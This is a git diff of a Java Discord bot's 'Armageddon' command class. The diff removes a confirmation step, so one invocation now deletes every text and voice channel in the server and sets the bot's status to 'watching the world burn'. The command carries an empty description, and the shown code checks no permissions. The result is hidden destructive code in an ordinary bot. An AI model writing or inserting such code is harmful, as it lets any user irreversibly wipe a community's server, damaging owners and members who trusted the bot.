@@ -9,35 +9,22 @@ import net.dv8tion.jda.core.entities.VoiceChannel;
 import tech.hadenw.shmamesbot.Shmames;
 
 public class Armageddon implements ICommand {
-	private boolean isPrimed;
-	
-	public Armageddon() {
-		isPrimed = false;
-	}
-	
 	@Override
 	public String getDescription() {
-		isPrimed = false;
 		return "";
 	}
 
 	@Override
 	public String run(String args, User author, Message message) {
-		if(isPrimed) {
-			for (TextChannel c : message.getGuild().getTextChannels()) {
-				c.delete().queue();
-			}
-
-			for (VoiceChannel c : message.getGuild().getVoiceChannels()) {
-				c.delete().queue();
-			}
-
-			isPrimed = false;
-			
-			Shmames.getJDA().getPresence().setGame(Game.of(GameType.WATCHING, "the world burn"));
-		} else {
-			isPrimed = true;
+		for (TextChannel c : message.getGuild().getTextChannels()) {
+			c.delete().queue();
 		}
+
+		for (VoiceChannel c : message.getGuild().getVoiceChannels()) {
+			c.delete().queue();
+		}
+		
+		Shmames.getJDA().getPresence().setGame(Game.of(GameType.WATCHING, "the world burn"));
 		
 		return null;
 	}
